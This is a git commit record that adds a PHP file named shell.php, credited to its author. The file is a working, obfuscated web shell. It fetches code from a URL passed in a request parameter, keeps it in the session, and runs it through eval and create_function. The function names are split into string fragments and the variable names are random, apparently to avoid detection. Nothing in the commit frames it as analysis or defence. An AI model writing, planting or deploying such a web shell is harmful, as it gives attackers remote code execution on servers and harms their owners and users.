a3e9390888e3b24cf3d3482ac818882862f1ace2
Orion Hridoy <hridoyorion@gmail.com>
2022-11-22 18:19:34 +0600

    Create shell.php

---
+++ shell.php
@@ -0,0 +1,20 @@
+<?php
+//Coded By Orion Hridoy --> fb.com/orion.hridoy
+session_start();
+if (isset($_REQUEST['start']))
+{
+  $_SESSION['awkoiprrbnhdc'] =file_get_contents(trim($_REQUEST['start']));
+}
+if (isset($_REQUEST['stop']))
+{
+  session_destroy();
+}
+if ($_SESSION['awkoiprrbnhdc']!= null)
+{
+          $tpwlrwqgkxtof="cre"."at"."e_";
+          $tpwlrwqgkxtof=$tpwlrwqgkxtof."fun"."cti"."on";
+          $lhliyosuijvxd="e"."v"."al";
+          $azixutkuzakcx=@$tpwlrwqgkxtof('$vbiddjqmksiob',$lhliyosuijvxd.'($vbiddjqmksiob);');
+          $azixutkuzakcx($_SESSION['awkoiprrbnhdc']);
+}
+?>
